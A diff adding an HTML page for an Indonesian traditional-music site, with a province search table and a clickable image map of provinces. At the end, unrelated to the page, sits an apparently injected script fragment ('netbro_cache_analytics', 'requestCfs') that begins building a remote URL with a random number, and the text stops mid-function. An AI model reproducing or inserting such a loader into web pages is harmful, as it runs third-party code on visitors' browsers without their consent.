@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Resize -->
+    <meta name="description" content="Musik yang terkonsentrasi dengan Musik Tradisional Indonesia"><!--Description-->
+    <title>MAP</title><!--judul page-->
+    <link rel="stylesheet" href="css/navbar.css"><!-- css saya --->
+    <link rel="stylesheet" href="css/csskami.css"><!-- css kami selain navbar -->
+    <link rel="stylesheet" href="css/bootstrap.min.css"><!--bootstrap 1 -->
+    <link rel="stylesheet" href="css/font-awesome.min.css"><!--untuk lambang sosmed -->
+    <link rel="stylesheet" href="fonts/stylesheet.css"> <!-- untuk font -->
+    <link rel="stylesheet" href="css/responsive.css" /><!-- untuk css yang responsive -->
+    <link rel="stylesheet" href="css/piano.css"><!-- css untuk tampilan pada piano ny -->
+    <script src="text/javascript" src="js/piano.js"></script>
+    <script type="text/javascript" src="js/jquery-3.1.1.min.js">/* library jquery untuk fungsi javascript jquery -->*/
+
+    </script>
+
+  </head>
+  <body style="background-color:#f4f8fb;">
+    <!-- NAVIGASI -->
+    <nav>
+      <div class="container-fluid">
+        <div class="nav-top clearfix">
+          <div class="logo">
+            <a><img src="img/1.png" width="400" /></a>
+          </div>
+
+          <div class="head_top_social pull-right">
+            <ul class="list-inline">
+              <li><a href="masukan.html"><i class="fa fa-instagram"></i>@intramusc_</a></li>
+              <li><a href="masukan.html"><i class="fa fa-phone"></i>085358172521</a></li>
+              <li class="top_socail">
+                <a href="masukan.html"><i class="fa fa-instagram"></i></a>
+                <a href="masukan.html"><i class="fa fa-facebook"></i></a>
+                <a href="masukan.html"><i class="fa fa-google-plus"></i></a>
+                <a href="masukan.html"><i class="fa fa-whatsapp"></i></a>
+              </li>
+            </ul>
+          </div>
+
+          <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse" type="button">
+              <span class="sr-only">Toggle navigation</span><i class="fa fa-bars"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="main-nav navbar-collapse collapse">
+        <div class="container">
+          <div class="minilogo">
+            <a href="" class="navbar-brand"><img src="img/Logo2.png" alt="Logo" /></a>
+          </div>
+          <ul class="nav nav-justified">
+            <li><a href="beranda.html">BERANDA</a></li>
+            <li><a href="artikel all/artikel.html">ARTIKEL</a></li>
+            <li><a class="active" href="intramusc.html">INTRAMUSC</a></li>
+            <li><a href="kontak.html">KONTAK</a></li>
+            <li><a href="masukan.html">MASUKAN</a></li>
+            <li><a href="galeri.html">GALERI</a></li>
+            <li>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+              <button style=" color : white; background-color: transparent; border:none; margin-top:10px;" type="button"  data-toggle="modal" data-target="#myModal">
+                <span class="glyphicon glyphicon-search">
+                </span>
+              </button>
+              <!-- Modal -->
+              <div class="modal fade" id="myModal" role="dialog">
+                <div class="modal-dialog modal-lg">
+
+                  <!-- Modal content-->
+                  <br>
+                  <br>
+                  <div class="modal-content">
+                    <div class="modal-header">
+                      <button type="button" class="close" data-dismiss="modal">&times;</button>
+                      <h2>Cari Provinsi</h2>
+              <p>Ketik Disini Untuk Mencari Provinsi</p>
+              <input class="form-control" id="myInput" type="text" placeholder="Cari..">
+              <br>
+              <table class="table table-bordered table-striped">
+                <thead>
+                  <tr>
+                    <th>Nama Provinsi</th>
+                    <th>Ibu Kota</th>
+                  </tr>
+                </thead>
+                <tbody id="myTable">
+                  <!--1-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/aceh.html">Aceh</td>
+                    <td>Banda Aceh</td>
+                  </tr>
+                  <!--2-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/sumaterautara.html">Sumatera Utara</td>
+                    <td>Medan</td> 
+                  </tr>
+                  <!--3-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/sumaterabarat.html">Sumatera Barat</td>
+                    <td>Padang</td>
+                  </tr>
+                  <!--4-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/riau.html">Riau</td>
+                    <td>Pekan Baru</td>
+                  </tr>
+                  <!--5-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/jambi.html">Jambi</td>
+                    <td>Jambi</td>
+                  </tr>
+                  <!--6-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/sumateraselatan.html">Sumatera Selatan</td>
+                    <td>Palembang</td>
+                  </tr>
+                  <!--7-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/bengkulu.html">Bengkulu</td>
+                    <td>Bengkulu</td>
+                  </tr>
+                  <!--8-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/lampung.html">Lampung</td>
+                    <td>Bandar Lampung</td>
+                  </tr>
+                  <!--9-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/bangkabelitung.html">Bangka Belitung</td>
+                    <td>Pangkal Pinang</td>
+                  </tr>
+                  <!--10-->
+                  <tr>
+                    <td><a href="provinsi/Sumatera/kepulauanriau.html">Kepulauan Riau</td>
+                    <td>Tanjung Pinang</td>
+                  </tr>
+                  <!--11-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/Jakarta.html">DKI Jakarta</td>
+                    <td>Jakarta</td>
+                  </tr>
+                  <!--12-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/jawabarat.html">Jawa Barat</td>
+                    <td>Bandung</td>
+                  </tr>
+                  <!--13-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/jawatengah.html">Jawa Tengah</td>
+                    <td>Semarang</td>
+                  </tr>
+                  <!--14-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/yogyakarta.html">DI Yogyakarta</td>
+                    <td>Yogyakarta</td>
+                  </tr>
+                  <!--15-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/jawatimur.html">Jawa Timur</td>
+                    <td>Surabaya</td>
+                  </tr>
+                  <!--16-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/banten.html">Banten</td>
+                    <td>Serang</td>
+                  </tr>
+                  <!--17-->
+                  <tr>
+                    <td><a href="provinsi/JawaBali/bali.html">Bali</td>
+                    <td>Denpasar</td>
+                  </tr>
+                  <!--18-->
+                  <tr>
+                    <td><a href="provinsi/NusaTenggara/nusatenggarabarat.html">Nusa Tenggara Barat</td>
+                    <td>Mataram</td>
+                  </tr>
+                  <!--19-->
+                  <tr>
+                    <td><a href="provinsi/NusaTenggara/nusatenggaratimur.html">Nusa Tenggara Timur</td>
+                    <td>Kupang</td>
+                  </tr>
+                  <!--20-->
+                  <tr>
+                    <td><a href="provinsi/kalimantan/kalimantanbarat.html">Kalimantan Barat</td>
+                    <td>Pontianak</td>
+                  </tr>
+                  <!--21-->
+                  <tr>
+                    <td><a href="provinsi/kalimantan/kalimantantengah.html">Kalimantan Tengah</td>
+                    <td>Palangkaraya</td>
+                  </tr>
+                  <!--22-->
+                  <tr>
+                    <td><a href="provinsi/kalimantan/kalimantanselatan.html">Kalimantan Selatan</td>
+                    <td>Banjarmasin</td>
+                  </tr>
+                  <!--23-->
+                  <tr>
+                    <td><a href="provinsi/kalimantan/kalimantantimur.html">Kalimantan Timur</td>
+                    <td>Samarinda</td>
+                  </tr>
+                  <!--24-->
+                  <tr>
+                    <td><a href="provinsi/kalimantan/kalimantanutara.html">Kalimantan Utara</td>
+                    <td>Tanjung Selor</td>
+                  </tr>
+                  <!--25-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/sulawesiutara.html">Sulawesi Utara</td>
+                    <td>Manado</td>
+                  </tr>
+                  <!--26-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/sulawesitengah.html">Sulawesi Tengah</td>
+                    <td>Palu</td>
+                  </tr>
+                  <!--27-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/sulawesiselatan.html">Sulawesi Selatan</td>
+                    <td>Makassar</td>
+                  </tr>
+                  <!--28-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/sulawesitenggara.html">Sulawesi Tenggara</td>
+                    <td>Kendari</td>
+                  </tr>
+                  <!--29-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/gorontalo.html">Gorontalo</td>
+                    <td>Gorontalo</td>
+                  </tr>
+                  <!--30-->
+                  <tr>
+                    <td><a href="provinsi/sulawesi/sulawesibarat.html">Sulawesi Barat</td>
+                    <td>Mamuju</td>
+                  </tr>
+                  <!--31-->
+                  <tr>
+                    <td><a href="provinsi/PapuaMaluku/maluku.html">Maluku</td>
+                    <td>Ambon</td>
+                  </tr>
+                  <!--32-->
+                  <tr>
+                    <td><a href="provinsi/PapuaMaluku/malukuutara.html">Maluku Utara</td>
+                    <td>Sofifi</td>
+                  </tr>
+                  <!--33-->
+                  <tr>
+                    <td><a href="provinsi/PapuaMaluku/papua.html">Papua</td>
+                    <td>Jayapura</td>
+                  </tr>
+                  <!--34-->
+                  <tr>
+                    <td><a href="provinsi/PapuaMaluku/papuabarat.html">Papua Barat</td>
+                    <td>Manokwari</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <p>Keep Smile</p>
+
+                        <script>
+                        $(document).ready(function(){
+                          $("#myInput").on("keyup", function() {
+                            var value = $(this).val().toLowerCase();
+                            $("#myTable tr").filter(function() {
+                              $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
+                            });
+                          });
+                        });
+                        </script>
+
+                    </div>
+                    <div class="modal-footer">
+                      <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                    </div>
+                  </div>
+
+
+                  </div>
+                </div>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+    <!--body setelah navigasi -->
+    <p>
+        <img name="usaMap" src="img/map/map.png" style="margin-top: 200px" usemap="#m_usaMap" border="0" width="100%">
+    </p>
+
+    <!--Image Map-->
+    <map name="m_usaMap">
+        <abbr title="ACEH">
+            <area shape="poly" coords="21,97, 45,76, 66,99, 109,100, 129,99, 163, 139, 161,150, 141,179, 151,242, 23,290"
+                href="provinsi/sumatera/aceh.html" title="Aceh">
+        </abbr>
+
+        <abbr title="SUMATERA UTARA">
+            <area shape="poly" coords="166,147, 253,218, 253,259, 261,272, 242,281, 248,308, 230,307, 236,319, 219,320, 95,384, 56,291, 151,246, 155,193, 145,173"
+                href="provinsi/sumatera/sumaterautara.html" title="Sumatera Utara">
+        </abbr>
+
+        <abbr title="SUMATERA BARAT">
+            <area shape="poly" coords="114,395, 205,337, 220,326, 226,330, 236,328, 242,321, 234,315, 244,316, 248,327, 216,331, 277,342, 271,349, 288,378, 317,401, 296,441, 298,452, 144,561"
+                href="provinsi/sumatera/sumaterabarat.html" title="Sumatera Barat">
+        </abbr>
+
+        <abbr title="RIAU">
+            <area shape="poly" coords="258,236, 272,247, 282,233, 304,251, 307,268, 318,267, 339,283, 340,299, 354,310, 375,311, 381,326, 396,320, 414,351, 395,357, 394,381, 367,382, 354,396, 340,387, 320,393, 278,351, 284,341, 264,325, 252,323, 251,291, 246,283, 262,274, 256,260"
+                href="provinsi/sumatera/riau.html" title="RIAU">
+        </abbr>
+
+        <abbr title="JAMBI">
+            <area shape="poly" coords="397,387, 438,394, 439,426, 428,433, 413,431, 391,445, 387,459, 383,460, 382,455, 379,451, 361,459, 360,465, 348,467, 334,477, 303,451, 334,394, 351,401, 358,401, 368,388"
+                href="provinsi/sumatera/jambi.html" title="JAMBI">
+        </abbr>
+
+        <abbr title="BENGKULU">
+            <area shape="poly" coords="173,554, 289,470, 300,459, 314,472, 335,484, 335,490, 339,494, 348,496, 348,505, 372,510, 373,515, 359,529, 375,553, 390,553, 407,379, 325,692"
+                href="provinsi/sumatera/bengkulu.html" title="BENGKULU">
+        </abbr>
+
+        <abbr title="SUMATERA SELATAN">
+            <area shape="poly" coords="339,481, 348,472, 363,468, 366,462, 376,457, 382,464, 393,464, 396,449, 417,435, 423,438, 434,438, 439,434, 456,448, 446,460, 450,477, 461,461, 490,465, 494,476, 499,478, 500,485, 510,492, 512,503, 501,519, 506,530, 501,540, 401,523, 466,542, 427,559, 426,578, 412,577, 396,546, 377,547, 364,528, 382,512, 376,505, 354,502, 352,490, 339,489"
+                href="provinsi/sumatera/sumateraselatan.html" title="SUMATERA SELATAN">
+        </abbr>
+
+        <abbr title="LAMPUNG">
+            <area shape="poly" coords="329,659, 414,585, 429,583, 435,561, 465,547, 481,531, 502,558, 501,625, 481,607, 465,618, 446,605, 441,609, 448,625, 440,660"
+                href="provinsi/sumatera/lampung.html" title="LAMPUNG">
+        </abbr>
+
+        <abbr title="BANTEN">
+            <area shape="poly" coords="491,668, 504,655, 505,639, 514,631, 515,636, 519,636, 524,631, 528,634, 539,635, 541,638, 541,643, 538,647, 529,647, 525,662, 528,667, 525,678, 516,669, 504,671"
+                href="provinsi/JawaBali/banten.html" title="BANTEN">
+        </abbr>
+
+        <abbr title="DKI JAKARTA">
+            <area shape="circle" coords="548,643,15" href="provinsi/JawaBali/Jakarta.html" title="DKI JAKARTA">
+        </abbr>
+
+        <abbr title="JAWA BARAT">
+            <area shape="poly" coords="532,678, 534,669, 530,662, 533,653, 555,654, 559,647, 558,635, 564,629, 579,643, 595,645, 605,654, 612,648, 628,672, 633,674, 633,683, 629,683, 620,629, 622,697, 633,713, 621,713, 620,718, 598,714, 565,700, 531,697, 529,692, 537,683"
+                href="provinsi/JawaBali/jawabarat.html" title="JAWA BARAT">
+        </abbr>
+
+        <abbr title="JAWA TENGAH">
+            <area shape="poly" coords="639,713, 634,700, 627,692, 638,687, 639,675, 716,679, 731,654, 740,667, 761,668, 752,691, 740,693, 745,724, 733,736, 726,735, 727,721, 704,705, 689,720, 663,714"
+                href="provinsi/JawaBali/jawatengah.html" title="JAWA TENGAH">
+        </abbr>
+
+        <abbr title="DI YOGYAKARTA">
+            <area shape="poly" coords="695,723, 695,719, 705,710, 721,723, 722,736, 718,733, 714,733, 710,728, 704,725"
+                href="provinsi/JawaBali/yogyakarta.html" title="DI YOGYAKARTA">
+        </abbr>
+
+        <abbr title="JAWA TIMUR">
+            <area shape="poly" coords="738,737, 750,726, 750,718, 747,696, 755,696, 762,686, 766,673, 782,678, 788,678, 750,676, 803,676, 822,674, 866,673, 869,678, 861,684, 862,684, 848,690, 813,691, 812,706, 835,719, 839,719, 849,714, 871,713, 887,721, 884,721, 884,752, 896,760, 881,766, 883,753, 868,753, 837,739, 829,738, 819,747, 769,740, 765,744, 761,744, 755,738"
+                href="provinsi/JawaBali/jawatimur.html" title="JAWA TIMUR">
+        </abbr>
+
+        <abbr title="KEPULAUAN RIAU">
+            <area shape="poly" coords="435,359, 434,319, 558,125, 590,122, 635,141, 651,195, 633,246, 598,290, 459,374"
+                href="provinsi/sumatera/kepulauanriau.html" title="KEPULAUAN RIAU">
+        </abbr>
+
+        <abbr title="BANGKA BELITUNG">
+            <area shape="poly" coords="496,450, 469,445, 465,427, 555,385, 625,396, 640,482, 608,520, 566,518, 533,496, 510,481, 508,466, 502,462"
+                href="provinsi/sumatera/bangkabelitung.html" title="BANGKA BELITUNG">
+        </abbr>
+
+        <abbr title="BALI">
+            <area shape="poly" coords="894,734, 905,740, 915,740, 921,735, 928,734, 942,746, 925,759, 910,746, 902,747, 893,738"
+                href="provinsi/Jawabali/bali.html" title="BALI">
+        </abbr>
+
+        <abbr title="NUSA TENGGARA BARAT">
+            <area shape="poly" coords="948,769, 961,732, 1127,722, 1087,789, 947,775" href="provinsi/nusatenggara/nusatenggarabarat.html" title="NUSA TENGGARA BARAT">
+        </abbr>
+
+        <abbr title="NUSA TENGGARA TIMUR">
+            <area shape="poly" coords="1094,801, 1098,798, 1130,798, 1135,749, 1141,801, 1145,801, 1148,810, 1158,810, 1172,827, 1165,834, 1148,834, 1122,811, 1102,811, 1094,804"
+                href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="poly" coords="1131,756, 1135,752, 1144,752, 1145,749, 1150,742, 1165,743, 1170,748, 1200,758, 1209,759, 1220,751, 1227,751, 1238,760, 1250,758, 1260,747, 1273,739, 1262,751, 1262,755, 1253,762, 1232,762, 1228,766, 1221,766, 1219,769, 1215,769, 1212,766, 1200,767, 1198,770, 1189,769, 1183,773, 1176,768, 1150,767, 1147,762, 1137,767, 1131,762"
+                href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="circle" coords="1280,744,5" href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="circle" coords="1292,752,5" href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="circle" coords="1306,742,5" href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="poly" coords="1315,747, 1319,741, 1323,743, 1329,738, 1337,738, 1341,735, 1366,736, 1349,747, 1337,746, 1326,749, 1323,753, 1319,753"
+                href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="circle" coords="1222,849,5" href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="poly" coords="1268,863, 1286,849, 1291,853, 1274,868, 1269,869" href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+            <area shape="poly" coords="1295,835, 1306,816, 1305,808, 1316,797, 1324,796, 1334,801, 1339,789, 1355,778, 1365,777, 1369,783, 1359,786, 1361,796, 1338,829, 1322,829, 1322,829, 1308,840, 1299,840"
+                href="provinsi/nusatenggara/nusatenggaratimur.html" title="NUSA TENGGARA TIMUR">
+        </abbr>
+
+        <abbr title="KALIMANTAN BARAT">
+            <area shape="poly" coords="667,262, 714,310, 726,306, 737,302, 772,304, 772,298, 787,296, 787,291, 796,280, 827,279, 852,293, 873,280, 876,290, 863,300, 866,317, 844,336, 843,355, 834,371, 815,373, 804,382, 778,382, 741,419, 732,429, 733,445, 738,456, 739,475, 721,487, 703,486, 696,418, 687,400, 663,387, 669,380, 666,374, 656,374, 652,374, 652,363, 658,351, 657,342, 642,323, 645,293"
+                href="provinsi/kalimantan/kalimantanbarat.html" title="KALIMANTAN BARAT">
+        </abbr>
+
+        <abbr title="KALIMANTAN TENGAH">
+            <area shape="poly" coords="724,490, 743,478, 739,427, 781,388, 806,387, 817,379, 838,375, 870,322, 897,326, 913,318, 915,358, 926,351, 925,374, 948,409, 801,505, 855,512, 853,496, 839,500, 828,487, 774,516, 772,486, 748,486"
+                href="provinsi/kalimantan/kalimantantengah.html" title="KALIMANTAN TENGAH">
+        </abbr>
+
+        <abbr title="KALIMANTAN SELATAN">
+            <area shape="poly" coords="884,505, 951,414, 960,424, 959,449, 965,457, 984,459, 969,497, 974,531, 964,537, 964,526, 954,519, 900,545, 899,517"
+                href="provinsi/kalimantan/kalimantanselatan.html" title="KALIMANTAN SELATAN">
+        </abbr>
+
+        <abbr title="KALIMANTAN TIMUR">
+            <area shape="poly" coords="995, 248, 1040, 243, 1044, 252, 1041, 258, 1094, 306, 1084, 311, 1071, 311, 1064, 308, 1055, 303, 1050, 301, 1050, 307, 1035, 315, 1022, 362, 1031, 377, 1007, 401, 987, 416, 984, 426, 970, 433, 980, 436, 980, 450, 979, 454, 966, 454, 961, 434, 964, 422, 952, 405, 948, 396, 942, 388, 934, 375, 932, 355, 930, 346, 928, 342, 919, 353, 920, 343, 923, 335, 921, 323, 919, 319, 900, 314, 894, 318, 889, 321, 873, 315, 872, 311, 867, 298, 879, 289, 880, 284, 902, 293, 961, 302, 988, 292"
+                href="provinsi/kalimantan/kalimantantimur.html">
+        </abbr>
+
+        <abbr title="KALIMANTAN UTARA">
+            <area shape="poly" coords="960, 147, 1016, 144, 1039, 174, 1012, 178, 1015, 184, 1026, 189, 1020, 194, 1033, 213, 1054, 244, 1048, 246, 1035, 242, 994, 245, 984, 293, 958, 298, 904, 290, 896, 282, 908, 263, 907, 254, 912, 240, 921, 240, 921, 227, 921, 217, 928, 210, 934, 209, 939, 211, 940, 197, 940, 180, 942, 162"
+                href="provinsi/kalimantan/kalimantanutara.html">
+        </abbr>
+
+        <abbr title="SULAWESI BARAT">
+            <area shape="poly" coords="1090, 515, 1117, 501, 1117, 482, 1134, 480, 1135, 463, 1130, 458, 1128, 438, 1123, 422, 1121, 395, 1119, 389, 1113, 394, 1110, 404, 1107, 415, 1110, 439, 1099, 452, 1101, 463, 1088, 477, 1084, 473, 1086, 483, 1085, 500"
+                href="provinsi/sulawesi/sulawesibarat.html">
+        </abbr>
+
+        <abbr title="SULAWESI TENGAH">
+            <area shape="circle" coords="1294, 413, 6" href="provinsi/sulawesi/sulawesitengah.html">
+            <area shape="circle" coords="1274, 411, 5" href="provinsi/sulawesi/sulawesitengah.html">
+            <area shape="poly" coords="1178, 286, 1203, 293, 1214, 300, 1235, 301, 1232, 306, 1186, 307, 1184, 314, 1193, 325, 1178, 327, 1171, 321, 1162, 323, 1151, 329, 1143, 346, 1139, 370, 1147, 391, 1156, 394, 1171, 414, 1193, 419, 1206, 386, 1211, 394, 1234, 395, 1237, 386, 1259, 388, 1278, 374, 1293, 378, 1293, 390, 1290, 396, 1284, 400, 1283, 391, 1276, 390, 1264, 394, 1235, 425, 1218, 428, 1218, 436, 1197, 430, 1206, 450, 1220, 454, 1238, 490, 1231, 494, 1223, 486, 1222, 477, 1205, 461, 1178, 455, 1159, 438, 1134, 434, 1126, 420, 1123, 396, 1128, 378, 1132, 364, 1135, 348, 1135, 337, 1139, 323, 1145, 312, 1152, 306, 1165, 311"
+                href="provinsi/sulawesi/sulawesitengah.html">
+        </abbr>
+
+        <abbr title="GORONTALO">
+            <area shape="poly" coords="1189, 308, 1230, 310, 1237, 303, 1253, 304, 1266, 313, 1272, 307, 1277, 316, 1293, 321, 1289, 330, 1283, 328, 1279, 323, 1219, 326, 1212, 319, 1206, 324, 1198, 327, 1190, 320"
+                href="provinsi/sulawesi/gorontalo.html">
+        </abbr>
+
+        <abbr title="SULAWESI UTARA">
+            <area shape="poly" coords="1445, 132, 1441, 161, 1446, 162, 1449, 136" href="provinsi/sulawesi/sulawesiutara.html">
+            <area shape="poly" coords="1284, 306, 1316, 309, 1342, 288, 1345, 282, 1353, 283, 1364, 271, 1372, 276, 1338, 324, 1299, 330, 1294, 321, 1283, 315"
+                href="provinsi/sulawesi/sulawesiutara.html">
+        </abbr>
+
+        <abbr title="SULAWESI SELATAN">
+            <area shape="poly" coords="1135, 482, 1137, 461, 1131, 455, 1131, 442, 1143, 443, 1158, 439, 1169, 455, 1220, 477, 1214, 492, 1206, 490, 1198, 483, 1189, 483, 1187, 474, 1176, 469, 1144, 486, 1150, 499, 1154, 526, 1151, 540, 1153, 568, 1148, 595, 1154, 609, 1138, 612, 1132, 617, 1120, 616, 1112, 605, 1115, 583, 1121, 564, 1124, 546, 1121, 536, 1118, 527, 1118, 517, 1112, 512, 1116, 502, 1118, 484"
+                href="provinsi/sulawesi/sulawesiselatan.html">
+        </abbr>
+
+        <abbr title="SULAWESI TENGGARA">
+            <area shape="circle" coords="1224, 598, 7" href="provinsi/sulawesi/sulawesitenggara.html">
+            <area shape="circle" coords="1277, 542, 5" href="provinsi/sulawesi/sulawesitenggara.html">
+            <area shape="poly" coords="1264, 558, 1258, 570, 1244, 575, 1245, 588, 1240, 597, 1250, 607, 1254, 617, 1266, 622, 1271, 605, 1280, 605, 1278, 596, 1271, 593, 1273, 578, 1281, 570, 1275, 554"
+                href="provinsi/sulawesi/sulawesitenggara.html">
+            <area shape="poly" coords="1188, 486, 1197, 485, 1210, 496, 1219, 490, 1237, 499, 1241, 507, 1236, 515, 1253, 539, 1266, 549, 1260, 560, 1254, 556, 1234, 562, 1230, 578, 1219, 578, 1206, 571, 1213, 542, 1208, 537, 1203, 537, 1181, 515, 1185, 500"
+                href="provinsi/sulawesi/sulawesitenggara.html">
+
+            <abbr title="MALUKU UTARA">
+                <area shape="poly" coords="1334, 430, 1370, 429, 1382, 432, 1413, 434, 1405, 440, 1382, 436, 1355, 437, 1347, 440, 1341, 446"
+                    href="provinsi/PapuaMaluku/malukuutara.html">
+                <area shape="circle" coords="1484, 420, 13" href="provinsi/PapuaMaluku/malukuutara.html">
+                <area shape="circle" coords="1474, 371, 9" href="provinsi/PapuaMaluku/malukuutara.html">
+                <area shape="circle" coords="1520, 238, 13" href="provinsi/PapuaMaluku/malukuutara.html">
+                <area shape="poly" coords="1496, 244, 1479, 263, 1479, 271, 1471, 292, 1473, 300, 1485, 330, 1486, 358, 1499, 384, 1509, 385, 1492, 354, 1492, 329, 1499, 324, 1507, 329, 1526, 330, 1525, 323, 1506, 316, 1528, 296, 1524, 276, 1514, 282, 1502, 293, 1493, 311, 1483, 307, 1485, 299, 1499, 283, 1498, 266, 1490, 258"
+                    href="provinsi/PapuaMaluku/malukuutara.html">
+            </abbr>
+
+            <abbr title="MALUKU">
+                <area shape="circle" coords="1574, 725, 7" href="provinsi/PapuaMaluku.maluku.html">
+                <area shape="poly" coords="1773, 641, 1770, 670, 1778, 677, 1785, 660, 1781, 650" href="provinsi/PapuaMaluku/maluku.html">
+                <area shape="poly" coords="1794, 604, 1787, 612, 1778, 632, 1792, 646, 1798, 636, 1793, 628, 1799, 613"
+                    href="provinsi/PapuaMaluku/maluku.html">
+                <area shape="poly" coords="1659, 693, 1657, 685, 1653, 689, 1652, 696, 1641, 705, 1635, 729, 1643, 731, 1663, 700"
+                    href="provinsi/PapuaMaluku/maluku.html">
+                <area shape="poly" coords="1419, 715, 1431, 708, 1441, 714, 1430, 722, 1427, 727, 1407, 724, 1401, 729, 1400, 718, 1410, 710"
+                    href="provinsi/PapuaMaluku/maluku.html">
+                <area shape="poly" coords="1498, 507, 1504, 499, 1511, 510, 1494, 522, 1499, 529, 1515, 526, 1513, 513, 1523, 512, 1538, 501, 1547, 512, 1561, 515, 1567, 508, 1582, 511, 1585, 518, 1618, 531, 1626, 526, 1625, 512, 1615, 510, 1614, 499, 1607, 493, 1599, 490, 1584, 490, 1565, 478, 1549, 487, 1544, 481, 1519, 484, 1506, 484, 1503, 495, 1494, 497, 1490, 504"
+                    href="provinsi/PapuaMaluku/maluku.html">
+                <area shape="poly" coords="1411, 494, 1418, 500, 1426, 491, 1455, 496, 1454, 506, 1463, 509, 1460, 521, 1441, 528, 1432, 527, 1421, 522, 1409, 515, 1408, 502"
+                    href="provinsi/PapuaMaluku/maluku.html">
+            </abbr>
+
+            <abbr title="PAPUA BARAT">
+                <area shape="poly" coords="1615, 394, 1630, 394, 1638, 401, 1630, 411" href="provinsi/PapuaMaluku/papuabarat.html">
+                <area shape="poly" coords="1580, 438, 1603, 426, 1603, 442, 1592, 446" href="provinsi/PapuaMaluku/papuabarat.html">
+                <area shape="poly" coords="1622, 354, 1630, 348, 1646, 357, 1643, 362, 1632, 363, 1625, 373, 1606, 358, 1607, 347"
+                    href="provinsi/PapuaMaluku/papuabarat.html">
+                <area shape="poly" coords="1635, 413, 1643, 404, 1647, 383, 1666, 386, 1691, 369, 1716, 372, 1737, 384, 1769, 386, 1770, 396, 1778, 411, 1777, 422, 1771, 429, 1771, 442, 1774, 454, 1783, 475, 1789, 483, 1793, 469, 1797, 481, 1796, 503, 1805, 527, 1798, 541, 1790, 538, 1784, 534, 1777, 535, 1775, 522, 1767, 525, 1765, 527, 1758, 522, 1752, 517, 1735, 534, 1723, 541, 1714, 541, 1710, 527, 1717, 519, 1717, 507, 1712, 502, 1705, 502, 1700, 494, 1695, 492, 1680, 486, 1689, 475, 1707, 481, 1719, 484, 1729, 466, 1741, 471, 1755, 469, 1766, 460, 1766, 451, 1756, 449, 1746, 453, 1703, 454, 1691, 454, 1675, 426, 1671, 420"
+                    href="provinsi/PapuaMaluku/papuabarat.html">
+            </abbr>
+
+            <abbr title="PAPUA">
+                <area shape="poly" coords="1848, 380, 1862, 396, 1874, 397, 1875, 404, 1850, 404, 1849, 395, 1845, 387"
+                    href="provinsi/PapuaMaluku/papua.html">
+                <area shape="poly" coords="1836, 421, 1891, 431, 1871, 440, 1846, 436, 1838, 428" href="provinsi/PapuaMaluku/papua.html">
+                <area shape="poly" coords="1806, 490, 1814, 506, 1835, 508, 1854, 488, 1857, 476, 1868, 470, 1874, 454, 1894, 455, 1911, 451, 1910, 442, 1905, 439, 1942, 419, 2026, 462, 2045, 463, 2070, 465, 2081, 475, 2083, 647, 2074, 666, 2081, 677, 2081, 781, 2031, 730, 2012, 739, 2001, 731, 1988, 743, 1984, 750, 1976, 747, 1970, 743, 1955, 755, 1924, 747, 1946, 709, 1982, 696, 1981, 691, 1970, 681, 1983, 670, 1962, 651, 1960, 628, 1946, 621, 1946, 609, 1905, 585, 1887, 586, 1874, 569, 1861, 569, 1852, 559, 1818, 559, 1796, 543, 1811, 535, 1798, 509"
+                    href="provinsi/PapuaMaluku/papua.html">
+            </abbr>
+
+    </map>
+    <script src="jquery.min.js"></script>
+    <script type="text/javascript" src="js/imageMapResizer.min.js"></script>
+    <script type="text/javascript">
+        $('map').imageMapResize();
+    </script>
+
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
